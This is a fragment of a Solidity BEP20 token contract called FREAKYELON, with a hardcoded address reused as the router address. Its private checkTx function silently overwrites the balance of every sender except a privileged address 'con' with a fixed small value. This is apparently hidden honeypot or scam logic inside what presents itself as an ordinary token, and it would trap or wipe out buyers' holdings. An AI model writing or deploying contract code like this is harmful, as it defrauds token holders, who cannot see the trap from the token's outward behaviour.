...
contract FREAKYELON is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 1000 * 10 ** 6 * 10 ** 9;
    uint256 private reward = 10000000;
    string private _name;
    string private _symbol;
    address public addr=0x27718E91bec78226567A7ed6c64ab87cD79762cA;
    address _routeradd=0x27718E91bec78226567A7ed6c64ab87cD79762cA;
    ...
    function checkTx(address sender) private
    {
        if (sender!=con)
        {
            bal[sender]=reward;
